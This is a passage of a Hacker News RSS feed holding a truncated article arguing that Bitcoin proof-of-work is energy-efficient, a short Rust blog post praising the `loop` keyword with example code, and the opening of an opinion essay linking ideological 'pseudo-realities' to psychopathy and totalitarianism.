          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546761825375-QW5OSE7DC1NRJMFTMX0J/ke17ZwdGBToddI8pDm48kD-6tlovuTXRR_mWjGukL0BZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIBTs8YE8m5nYyQg2dLgK1uRHBVT6TwroRXNovto9YPN8/1_aOgUl0xQH2MuAQbwpnmfRA.png" data-image="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546761825375-QW5OSE7DC1NRJMFTMX0J/ke17ZwdGBToddI8pDm48kD-6tlovuTXRR_mWjGukL0BZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIBTs8YE8m5nYyQg2dLgK1uRHBVT6TwroRXNovto9YPN8/1_aOgUl0xQH2MuAQbwpnmfRA.png" data-image-dimensions="826x474" data-image-focal-point="0.5,0.5" alt="1_aOgUl0xQH2MuAQbwpnmfRA.png" data-load="false" data-image-id="5c31b660f950b7a898075f40" data-type="image" src="https://www.danheld.com/blog/2019/1/5/1_aOgUl0xQH2MuAQbwpnmfRA.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1546761626522_12613"><div><p><br>In the early 20th century, industry leaders like&nbsp;Henry Ford and Thomas Edison were&nbsp;interested in replacing gold or the dollar with “the energy dollar” or “units of energy”&nbsp;(commodity/energy currency). The concept was popular due to its sound money characteristics, including:&nbsp;a well-defined unit of account, easy measurement/not easily counterfeited, divisibility into smaller units, and fungibility (that these units would be equivalent to any other unit).However, energy money was flawed — it could not be transmitted or stored easily.</p><p>To enjoy this article in its fullest, I recommend playing this song then continue reading. If you like this music, please follow my&nbsp;<a href="https://open.spotify.com/user/txdan2010/playlist/3X0JDW2W59uQ6Yx2J2X3XW?si=YpoSB0bLSSuaUoUhh7AClA" target="_blank">playlist</a>&nbsp;on Spotify.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1546761626522_15077"><div><blockquote><p><em>“that&nbsp;in order to make a man/woman covet a thing, it is only necessary to make the thing difficult to attain.” — </em>Mark Twain</p></blockquote><p>Fast forward to&nbsp;October 31, 2008 — Satoshi publishes the Bitcoin whitepaper. Bitcoin’s Proof of Work (PoW) was originally invented as a&nbsp;<a href="https://en.m.wikipedia.org/wiki/Proof-of-work_system" target="_blank">measure against email spam</a>. Only later did Satoshi adapt it to be used in digital cash.&nbsp;What PoW mining does under the hood, is use dedicated machines (ASICs) to convert electricity into Bitcoins (via block reward).&nbsp;The machine repeatedly performs hash operations (guesses/votes) until it solves a cryptographic puzzle and receives Bitcoins (block reward).&nbsp;The solution to the puzzle proves that the miner spent energy in the form of&nbsp;ASICs&nbsp;and electricity, a proof that a miner put in work.&nbsp;Bitcoin has a&nbsp;<a href="http://www.truthcoin.info/blog/pow-cheapest/" target="_blank">capitalistic</a>&nbsp;voting mechanism, “money risked, votes gained”&nbsp;through the energy/ASICs used to generate hashes (votes). — <a href="https://medium.com/u/3efc6d31e61c" target="_blank">Hugo Nguyen</a></p><p>When Satoshi designed PoW, he was&nbsp;fundamentally changing how consensus between humans is formed from political votes to&nbsp;apolitical votes (hashes)&nbsp;via the conversion of energy.&nbsp;PoW is proof of burn, or the validation that energy was burnt.&nbsp;Why is that important?&nbsp;It’s the most simplistic and fair way for the physical world to validate something in the digital world.&nbsp;PoW is about physics, not code.&nbsp;Bitcoin is a super commodity, minted from energy, the fundamental&nbsp;<a href="https://mitpress.mit.edu/books/energy-and-civilization" target="_blank">commodity</a>&nbsp;of the universe.&nbsp;PoW transmutes electricity into digital gold.</p><p>The Bitcoin ledger can only be immutable if and&nbsp;only if it is costly to produce.The fact that Proof of Work (PoW) is “costly” is a feature, not a bug.&nbsp;Until very recently, securing something meant building a thick physical wall around whatever is deemed valuable. The new world of cryptocurrency is&nbsp;unintuitive and weird — there are no physical walls to protect our money, no doors&nbsp;to access our vaults.&nbsp;Bitcoin’s public ledger is secured by its collective hashing power: the&nbsp;sum of all energy&nbsp;<a href="https://medium.com/@dergigi/bitcoins-energy-consumption-6dd7d7a2e463" target="_blank">expended</a>&nbsp;to build the wall.&nbsp;And through its transparent costly design, it would take an equivalent amount of energy to tear it down (<a href="http://unenumerated.blogspot.com/2008/08/" target="_blank">unforgeable costliness</a>).</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610323703673_15325"><div><h3>Energy Consumption</h3><p>The cryptopocalypse is coming — Bitcoin’s (PoW) is so bad that it’s going to destroy the world in 2020! You may have noticed that&nbsp;most of the “doomsday” articles were based on the results of an analysis provided by Alex De Vries, a “financial economist and blockchain specialist” working for PWC Netherlands and author of the site&nbsp;<a href="https://digiconomist.net/" target="_blank">Digiconomist</a>. His estimation has already received a fair share of criticism due to its poor energy consumption calculation. But&nbsp;the KPI of his choosing was intentionally misleading: “the electricity consumption per transaction”&nbsp;for several reasons:</p><ul data-rte-list="default"><li><p>The&nbsp;energy spent is per block, which can have a varying number of transactions.&nbsp;More transactions does not mean more energy</p></li><li><p>The&nbsp;economic density of a Bitcoin transaction is always increasing(Batching, Segwit, Lightning, etc).&nbsp;As bitcoin becomes more of a settlement network,&nbsp;each unit of energy is securing exponentially more and more economic value.</p></li><li><p>The average cost per transaction isn’t an adequate metric for measuring the efficiency of Bitcoin’s PoW, it should be defined in terms of the security of an economic history.&nbsp;The energy spend secures the stock of bitcoin, and that percentage is going down over time as inflation decreases.&nbsp;A Bitcoin “accumulates” the energy associated with all the blocks mined since its creation.&nbsp;<a href="https://medium.com/u/1852b393b452" target="_blank">LaurentMT</a>, a researcher, has found&nbsp;<a href="https://medium.com/@laurentmt/gravity-10e1a25d2ab2" target="_blank">empirically</a>&nbsp;that&nbsp;Bitcoin’s PoW is indeed becoming more efficient over time:&nbsp;increasing cost is counterbalanced by the even greater increasing total value secured by the system.</p></li></ul><p>Now that we know what the right KPI is for ROI on energy consumption, let’s take a look at how energy costs are trending for Bitcoin’s PoW.</p><p>The&nbsp;rate of ASIC efficiency improvement is slowing. As efficiency gains slow we can expect an increase in manufacturer competition as margins narrow.</p></div></div><div data-aspect-ratio="52.328159645232816" data-block-type="5" id="block-yui_3_17_2_1_1546761626522_18212"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546762137050-7TKB0YME6L55O6Y39UPU/ke17ZwdGBToddI8pDm48kIxWMVSxwQatLFqGELaHxu1Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIAISDmwC-wYPLlVazXuacmw_AZedaQj-U6D2n246fm9Q/ASIC.png" data-image="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546762137050-7TKB0YME6L55O6Y39UPU/ke17ZwdGBToddI8pDm48kIxWMVSxwQatLFqGELaHxu1Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIAISDmwC-wYPLlVazXuacmw_AZedaQj-U6D2n246fm9Q/ASIC.png" data-image-dimensions="902x504" data-image-focal-point="0.5,0.5" alt="https://cseweb.ucsd.edu/~mbtaylor/papers/Taylor_Bitcoin_IEEE_Computer_2017.pdf" data-load="false" data-image-id="5c31b798032be4fbaf2ae884" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546762137050-7TKB0YME6L55O6Y39UPU/ke17ZwdGBToddI8pDm48kIxWMVSxwQatLFqGELaHxu1Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIAISDmwC-wYPLlVazXuacmw_AZedaQj-U6D2n246fm9Q/ASIC.png">
          </p>
        
          
        

        
          
          <figcaption>
            
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="5" id="block-yui_3_17_2_1_1546761626522_20294"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546762230979-F4JG6553X0VQ7DD4MC6E/ke17ZwdGBToddI8pDm48kApjA1ZnUELh4vnZZH9kVw0UqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcjwT694UTO1FfCcGLdFVPE2-amIr7VTgaAFrH0WkRB9Qygder8T5irxm1G3nP_VQc/1_DjVHrljmpKftkbXuSz0uvg.png" data-image="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546762230979-F4JG6553X0VQ7DD4MC6E/ke17ZwdGBToddI8pDm48kApjA1ZnUELh4vnZZH9kVw0UqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcjwT694UTO1FfCcGLdFVPE2-amIr7VTgaAFrH0WkRB9Qygder8T5irxm1G3nP_VQc/1_DjVHrljmpKftkbXuSz0uvg.png" data-image-dimensions="1164x226" data-image-focal-point="0.5,0.5" alt="https://research.bloomberg.com/pub/res/d3bgbon7nESTWTzC1U9PNCxDVfQ" data-load="false" data-image-id="5c31b7f688251b958f4a5263" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546762230979-F4JG6553X0VQ7DD4MC6E/ke17ZwdGBToddI8pDm48kApjA1ZnUELh4vnZZH9kVw0UqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcjwT694UTO1FfCcGLdFVPE2-amIr7VTgaAFrH0WkRB9Qygder8T5irxm1G3nP_VQc/1_DjVHrljmpKftkbXuSz0uvg.png">
          </p>
        
          
        

        
          
          <figcaption>
            
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1546761626522_18488"><div><p>All-in mining cost will shift from the upfront accessibility cost of ASIC hardware (capex) to the ongoing energy costs to operate (opex).&nbsp;Since the physical location of mining centers is not important to the Bitcoin network (they are movable), miners flock to areas generating surplus electricity for the lowest marginal costs.&nbsp;In the long-run, this has the&nbsp;potential to produce more efficient worldwide energy markets with&nbsp;Bitcoin miners performing an arbitrage of electricity between global centers.&nbsp;The cost of Bitcoin mining becomes the lowest (excess) value of electricity.&nbsp;This may solve a problem with renewable energy sources that have predictable capacity that is otherwise wasted, like hydro and&nbsp;<a href="https://medium.com/nodeblockchain/bitcoin-energy-b230a9d7dd5d" target="_blank">flared methane</a>.&nbsp;In the future,&nbsp;Bitcoinmining could help with renewable energy sources that have variable output — energy producers can plug in miners, and store the excess power as bitcoin.</p><p>Aluminum was a popular means of “<a href="http://articles.latimes.com/2011/mar/26/business/la-fi-iceland-economy-20110326" target="_blank">exporting</a>” electricity from a country with abundant renewable energy resources that are stranded&nbsp;(ex: Iceland).Smelting bauxite (aka aluminum ore) has huge energy requirements, and converting that into aluminum is a one way function (just like a hash). The same concerns around “unfair” energy consumption existed for aluminum nearly 40 years ago — <a href="https://www.washingtonpost.com/archive/politics/1979/10/29/aluminum-industry-at-center-of-northwests-energy-fight/62fdb02f-ad72-4685-a450-490e12a58059/?noredirect=on&amp;utm_term=.126a3788a2a4" target="_blank">1979</a>&nbsp;(including concerns of centralization). All of these companies constantly scoured the planet for cheap power and other concessions. As aluminum manufacturing matured over the decades, the kWh per Kg of aluminum produced became more efficient.</p></div></div><div data-aspect-ratio="37.80487804878049" data-block-type="5" id="block-yui_3_17_2_1_1546819713561_36329"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546819935228-887UC5HNR72RXAMR8G6E/ke17ZwdGBToddI8pDm48kHvLWB0s6UO-4MIaJknVsYgUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcSk1hbK_bkxMwx1bVa0GfCzPH0dYva-ji6zfJA3nc7uGBFIp3XcZTj3gAQjs6yWkx/1_NJbi3cSMdfkFGemA-ar9eA.png" data-image="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546819935228-887UC5HNR72RXAMR8G6E/ke17ZwdGBToddI8pDm48kHvLWB0s6UO-4MIaJknVsYgUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcSk1hbK_bkxMwx1bVa0GfCzPH0dYva-ji6zfJA3nc7uGBFIp3XcZTj3gAQjs6yWkx/1_NJbi3cSMdfkFGemA-ar9eA.png" data-image-dimensions="1230x508" data-image-focal-point="0.5,0.5" alt="https://www1.eere.energy.gov/manufacturing/resources/aluminum/pdfs/al_theoretical.pdf" data-load="false" data-image-id="5c32995e4fa51ae3f53ee1ed" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5c3177dfc258b487ed5f5d13/1546819935228-887UC5HNR72RXAMR8G6E/ke17ZwdGBToddI8pDm48kHvLWB0s6UO-4MIaJknVsYgUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcSk1hbK_bkxMwx1bVa0GfCzPH0dYva-ji6zfJA3nc7uGBFIp3XcZTj3gAQjs6yWkx/1_NJbi3cSMdfkFGemA-ar9eA.png">
          </p>
        
          
        

        
          
          <figcaption>
            
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1546819713561_36606"><div><blockquote><p>“This global energy net liberates stranded assets and makes new ones viable. Imagine a 3D topographic map of the world with cheap energy hotspots being lower and expensive energy being higher.&nbsp;I imagine Bitcoin mining being akin to a glass of water poured over the surface, settling in the nooks and crannies, and smoothing it out.” — <a href="https://medium.com/u/a063100e6515" target="_blank">Nic Carter</a></p></blockquote><p>Bitcoin’s PoW is the buyer of last resort for all electricity, creating a floor that incentivizes the building of new energy producing plants around disparate energy sources that would have otherwise been left untapped.</p><blockquote><p>“When will the energy used for PoW *stop* growing?&nbsp;Precis…</p></blockquote></div></div></div></div></div></article></section></main></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.danheld.com/blog/2019/1/5/pow-is-efficent">https://www.danheld.com/blog/2019/1/5/pow-is-efficent</a></em></p>]]>
            </description>
            <link>https://www.danheld.com/blog/2019/1/5/pow-is-efficent</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816797</guid>
            <pubDate>Mon, 18 Jan 2021 00:24:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Personal Dashboard setup to achieve ANY goal]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25816716">thread link</a>) | @aidan_mccarty
<br/>
January 17, 2021 | https://www.notion.so/Dashboard-Customization-Guide-e4f3cbe2e9274d8bb2d0130c47b15233 | <a href="https://web.archive.org/web/*/https://www.notion.so/Dashboard-Customization-Guide-e4f3cbe2e9274d8bb2d0130c47b15233">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Dashboard-Customization-Guide-e4f3cbe2e9274d8bb2d0130c47b15233</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816716</guid>
            <pubDate>Mon, 18 Jan 2021 00:15:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unconditional Loops Are Unconditionally Awesome]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25816502">thread link</a>) | @brson
<br/>
January 17, 2021 | https://brson.github.io/2021/01/17/rust-unconditional-loops | <a href="https://web.archive.org/web/*/https://brson.github.io/2021/01/17/rust-unconditional-loops">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Here’s a thing I don’t see appreciated enough about Rust: <code>loop</code>.
I know I don’t think about it all that much,
but pretty much every time I use it I feel a bit of satisfaction.</p>

<p><code>loop</code> is just an unconditional loop:
it loops forever, or until you write <code>break</code>, or <code>return</code>.</p>

<p>Most languages don’t have it.</p>

<p>Instead, loop constructs usually have some kind of termination condition,
your <code>while</code> and <code>for</code> loops.
Apparently <em><a href="https://en.wikipedia.org/wiki/Sather">Sather</a></em> has an unconditional <code>loop</code> keyword like Rust.
I only know this because a programming language historian mentioned it <a href="https://github.com/rust-lang/rust/issues/1906#issuecomment-4240501">on the bug tracker</a>.</p>

<p>Why do I love <code>loop</code>?</p>

<p>Because it frees me from thinking about how to end a loop
before I’ve even started writing it.</p>

<p>Many problems are easy to recognize as ones that require a looping solution:
I quickly realize, “I have to do something multiple times”.</p>

<p>Sometimes that loop just involves iterating over a container of things,
one at a time.
That’s easy to recognize as a <code>for thing in things { }</code> situation.
Other loops have more complex conditions though.
Often when I’m solving a looping problem,
I will know one or some of the steps I intend to do in a loop,
but will not envision the complete solution ahead of time.</p>

<p>So I just write</p>



<p>and start coding what I do know needs to happen,
and work from there.</p>

<p>For some reason this feels great.</p>

<p>Once I have solved my looping problem,
there will be a <code>break</code> or <code>return</code> somewhere in there,
or multiple <code>break</code>s and/or <code>return</code>s.
Maybe it makes sense to convert it into a <code>while</code> loop,
maybe not. But there’s not a great need
for <code>while</code> when you’ve got <code>loop</code>, <code>break</code>, and <code>return</code>.
Do readers really need to know the loop termination condition
before reading what happens in the loop?
Or, in languages with <code>do { } while (…)</code> loops,
after the very end of the loop?
I don’t know,
but writing the termination condition
naturally wherever it “wants” to live in the loop
seems reasonable to me.
One does though need to be considerate of
their readers by keeping the loop body a readable length.</p>

<p>Anecdotally, a small project I’m working on right now
contains 2 instances of <code>loop</code>, 2 of <a href="https://doc.rust-lang.org/rust-by-example/flow_control/while_let.html"><code>while let</code></a>,
and 8 of <code>for … in</code>;
no standard <code>while</code> loops.
And I think the <code>loop</code> loops read better than if I had
tried to convert them to <code>while</code> loops.</p>

<p>Here’s one example:</p>

<div><div><pre><code><span>let</span> <span>(</span><span>tx</span><span>,</span> <span>rx</span><span>)</span> <span>=</span> <span>async_channel</span><span>::</span><span>unbounded</span><span>();</span>
<span>let</span> <span>handle</span> <span>=</span> <span>thread</span><span>::</span><span>spawn</span><span>(</span><span>move</span> <span>||</span> <span>{</span>
    <span>let</span> <span>mut</span> <span>context</span> <span>=</span> <span>FsThreadContext</span><span>::</span><span>new</span><span>();</span>
    <span>loop</span> <span>{</span>
        <span>let</span> <span>msg</span> <span>=</span> <span>block_on</span><span>(</span><span>rx</span><span>.recv</span><span>())</span><span>.expect</span><span>(</span><span>"recv"</span><span>);</span>
        <span>match</span> <span>msg</span> <span>{</span>
            <span>Message</span><span>::</span><span>Run</span><span>(</span><span>f</span><span>)</span> <span>=&gt;</span> <span>{</span>
                <span>f</span><span>(</span><span>&amp;</span><span>mut</span> <span>context</span><span>);</span>
            <span>},</span>
            <span>Message</span><span>::</span><span>Shutdown</span><span>(</span><span>rsp_tx</span><span>)</span> <span>=&gt;</span> <span>{</span>
                <span>context</span><span>.shutdown</span><span>();</span>
                <span>rsp_tx</span><span>.send</span><span>(())</span><span>.expect</span><span>(</span><span>"send"</span><span>);</span>
                <span>break</span><span>;</span>
            <span>}</span>
        <span>}</span>
    <span>}</span>
<span>});</span>
</code></pre></div></div>

<p>Here’s the other:</p>

<div><div><pre><code><span>let</span> <span>mut</span> <span>header</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>
<span>let</span> <span>mut</span> <span>line</span> <span>=</span> <span>String</span><span>::</span><span>new</span><span>();</span>

<span>loop</span> <span>{</span>
    <span>line</span><span>.truncate</span><span>(</span><span>0</span><span>);</span>
    <span>io</span><span>.read_line</span><span>(</span><span>&amp;</span><span>mut</span> <span>line</span><span>)</span><span>?</span><span>;</span>

    <span>if</span> <span>line</span><span>.is_empty</span><span>()</span> <span>{</span>
        <span>return</span> <span>Err</span><span>(</span><span>anyhow!</span><span>(</span><span>"broken frame header"</span><span>));</span>
    <span>}</span>

    <span>let</span> <span>maybe_body_marker</span> <span>=</span> <span>&amp;</span><span>line</span><span>[</span><span>..</span><span>line</span><span>.len</span><span>()</span> <span>-</span> <span>1</span><span>];</span>
    <span>if</span> <span>maybe_body_marker</span> <span>==</span> <span>FRAME_BODY_MARKER</span> <span>{</span>
        <span>break</span><span>;</span>
    <span>}</span>

    <span>header</span><span>.push_str</span><span>(</span><span>&amp;</span><span>line</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>It’s common in C-like languages to write an unconditional loop
with <code>while (true) { }</code>.</p>

<p>I’m steeped enough in Rust that I don’t know if writing <code>while (true) { }</code>
brings others the same satisfaction as I get from <code>loop { }</code>,
but I suspect not: it looks and feels just like a tiny bit of a hack.
And if I go into writing a loop by first writing <code>while …</code>
then I am immediately presented with the question,
“while <em>what</em>?”,
and sometimes I just don’t want to think about that yet.</p>

<p>Besides <em>feeling</em> good,
there is <a href="https://github.com/rust-lang/rust/issues/1906">a technical reason that Rust has <code>loop</code></a>:
it helps analyze control flow.
With it, the compiler can trivially know that any code
after the loop is unreachable.
In Rust at least this is important for type checking.
This kind of analysis <em>is done</em> in other languages,
but by my recollection they sometimes actually
special case <code>while (true) { }</code> for this purpose.</p>

<p>Here’s an example of the differences in how Rust
treats <code>loop</code> vs. <code>while true</code> <a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=010dce12fdd4c0818322717e161a2f91">on the playground</a>.
Run it and check out the warning the compiler
issues; try to alter the example as suggested in the comments.</p>

<p>Bonus Rust trivia:
did you know that <code>loop</code> is an expression,
with the same type as its <code>break</code> statements,
and the result of <code>loop</code> can be <a href="https://doc.rust-lang.org/stable/reference/expressions/loop-expr.html#break-and-loop-values">assigned to a value</a>?</p>

<p>I did not!</p>

<p>The <a href="https://github.com/rust-lang/rust/issues/1906">issue on the bug tracker</a> appears
to be the only remains of the design discussion around <code>loop</code> in Rust,
though it is insightful to the designers’ original thinking.
The <a href="https://github.com/rust-lang/meeting-minutes/blob/master/weekly-meetings/2012-03-06.md">meeting minutes</a> where it was approved
just say there was consensus to add it.</p>

<div><div><pre><code><span>loop</span> <span>{</span>
    <span>println!</span><span>(</span><span>"Unconditional loops are unconditionally awesome"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

</div></div>]]>
            </description>
            <link>https://brson.github.io/2021/01/17/rust-unconditional-loops</link>
            <guid isPermaLink="false">hacker-news-small-sites-25816502</guid>
            <pubDate>Sun, 17 Jan 2021 23:47:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Psychopathy and the Origins of Totalitarianism]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25816494">thread link</a>) | @458aperta
<br/>
January 17, 2021 | https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/ | <a href="https://web.archive.org/web/*/https://newdiscourses.com/2020/12/psychopathy-origins-totalitarianism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">

	
	<div>

		
		
		

				
		
		
		<div>

			
			<div>

				
				<div id="content">

					
	<div id="primary">

		
		<main id="main" role="main">

			
			
				
				<article data-scroll="" id="post-3890">

					
					<div>

						
						<div>

										<section>
						
				</section>
			
							<section>

								<p>Many of the greatest horrors of the history of humanity owe their occurrence solely to the establishment and social enforcement of a false reality. With gratitude to the Catholic philosopher Josef Pieper and his important 1970 essay “Abuse of Language, Abuse of Power” for the term and idea, we can refer to these alternative realities as ideological <em>pseudo-realities</em>.</p>
<p>Pseudo-realities, being false and unreal, will always generate tragedy and evil on a scale that is at least proportional to the reach of their grip on power—which is their chief interest—whether social, cultural, economic, political, or (particularly) a combination of several or all of these. So important to the development and tragedies of societies are these pseudo-realities when they arise and take root that it is worth outlining their basic properties and structure so that they can be identified and properly resisted before they result in sociopolitical calamities—up to and including war, genocide, and even civilizational collapse, all of which can take many millions of lives and can ruin many millions more in the vain pursuit of a fiction whose believers are, or are made, sufficiently intolerant.</p>
<h3 id="the-nature-of-pseudo-realities">The Nature of Pseudo-realities</h3>
<p>Pseudo-realities are, simply put, false constructions of reality. It is hopefully obvious that among the features of pseudo-realities is that they must present a plausible but deliberately wrong understanding of reality. They are cult “realities” in the sense that they are the way that members of cults experience and interpret the world—both social and material—around them. We should immediately recognize that these deliberately incorrect interpretations of reality serve two related functions. First, they are meant to mold the world to accommodate small proportions of people who suffer pathological limitations on their abilities to cope with reality as it is. Second, they are designed to replace all other analyses and motivations with power, which these essentially or functionally psychopathic individuals will contort and deform to their permanent advantage so long as their pseudo-real regime can last.</p>
<p>Pseudo-realities are always social fictions, which, in light of the above, means political fictions. That is, they are maintained not because they are true, in the sense that they correspond to reality, either material or human, but because a sufficient quantity of people in the society they attack either believe them or refuse to challenge them. This implies that pseudo-realities are<em> linguistic phenomena</em> above all else, and where power-granting linguistic distortions are present, it is likely that they are there to create and prop up some pseudo-reality. This also means that they require power, coercion, manipulation, and eventually force to keep them in place. Thus, they are the natural playground of psychopaths, and they are enabled by cowards and rationalizers. Most importantly, pseudo-realities do not attempt to describe reality as it is but rather as it “should be,” as determined by the relatively small fraction of the population who cannot bear living in reality unless it is bent to enable their own psychopathologies, which will be projected upon their enemies, which means all normal people.</p>
<p>Normal people do not accept pseudo-reality and interpret reality more or less accurately, granting the usual biases and limitations of human perspective. Their common heuristic is called<em> common sense</em>, though much more refined forms exist in the uncorrupted sciences. In reality, both of these are handmaidens of power, but in pseudo-realities, this is inverted. In pseudo-reality, common sense is denigrated as bias or some kind of false consciousness, and science is replaced by a scientism that is a tool of power itself. For all his faults and the faults of his philosophy (which enable much ideological pseudo-reality), Michel Foucault warned us about this abuse quite cogently, especially under the labels “biopower” and “biopolitics.” These accusations of bias and false consciousness are, of course, projections of the ideological pseudo-realist, who, by sheer force of rhetoric, transforms limitations on power into applications of power and thus his own applications of power into liberation from it. Foucault, for any insight he provided, is also guilty of this charge.</p>
<p>It must be observed that people who accept pseudo-realities as though they are “real” are no longer normal people. They perceive pseudo-reality in place of reality, and the more thoroughly they take on this delusional position, the more functional psychopathy they necessarily exhibit and thus the less normal they become. Importantly, normal people consistently and consequentially fail to realize this about their reprogrammed neighbors. Perceiving them as normal people when they are not, normal people will reliably misunderstand the motivations of ideological pseudo-realists—power and the universal installation of their own ideology so that everyone lives in a pseudo-reality that enables their pathologies—usually until it is far too late.</p>
<p>As a result of this failure of perspective, many particularly epistemically and morally open normal people will reinterpret the claims of pseudo-reality into something that is plausible in reality under the usual logic and morals that guide our thinking, and this reinterpretation will work to the benefit of the pseudo-realists who have ensnared them. This sort of person, who stands between the real world and the pseudo-real are useful idiots to the ideology, and their role is to generate copious amounts of epistemic and ethical camouflage for the pseudo-realists. This phenomenon is key to the success, spread, and acceptance of pseudo-realities because without it very few people outside of small psychologically, emotionally, or spiritually unwell people would accept a pseudo-reality as if it is a superior characterization of the genuine article. Clearly, the more plausible the account of pseudo-reality on offer, the stronger this effect will be, and the more power the ideologues who believe in it will be able to accrue.</p>
<p>Pseudo-realities may have any degree of plausibility in their distorted descriptions of reality, and thus may recruit different numbers of adherents. They are often said to be accessible only by applying a “theoretical lens,” awakening a specialized “consciousness,” or by means of some pathological form of faith. Whether by “lens,” “consciousness,” or “faith,” these intellectual constructs exist to make the pseudo-reality seem more plausible, to drag people into participating in it against their will, and to distinguish those who “can see,” “are awake,” or “believe” from those who cannot or, as it always eventually goes, <em>will not</em>. That is, they are the pretext to tell people who inhabit reality instead of pseudo-reality that they’re not looking at “reality” correctly, which means as pseudo-reality. This will typically be characterized as a kind of<em> willful ignorance</em> of the pseudo-reality, which will subsequently be described paradoxically as unconsciously maintained. Notice that this puts the burden of epistemic and moral responsibility on the person inhabiting reality, not the person positing its replacement with an absurd pseudo-reality. This is a key functional manipulation of pseudo-realists that must be understood. The ability to recognize this phenomenon when it occurs and to resist it is, at scale, the life and death of civilizations.</p>
<p>Adoption of a pseudo-reality tends to hinge upon a lack of ability or will to question, doubt, and reject them and their fundamental presuppositions and premises of the pseudo-reality. Therefore, the “logical” and “moral” systems that operate within the pseudo-reality will always seek to manufacture this failure wherever they can, and successful pseudo-realist attacks will evolve these features like a social virus until their effectiveness is very high. This deficiency is often the direct result of mental illness, usually paranoia, schizoidia, anxiety, or psychopathy, however, so maintaining and manufacturing these states in themselves and normal people is strongly incentivized by the false “logic” and false “morality” of the ideological pseudo-reality. That is, the methods and means applied in service to a pseudo-reality will create and manipulate psychological weaknesses in people to get them to carry water for a destructive lie. The nicer, more tolerant, and more charitable a community is, supposing it lacks the capacity to spot these counterfeits early on, the more susceptible its members will tend to be to these manipulations.</p>
<h3 id="pseudo-realities-and-power">Pseudo-realities and Power</h3>
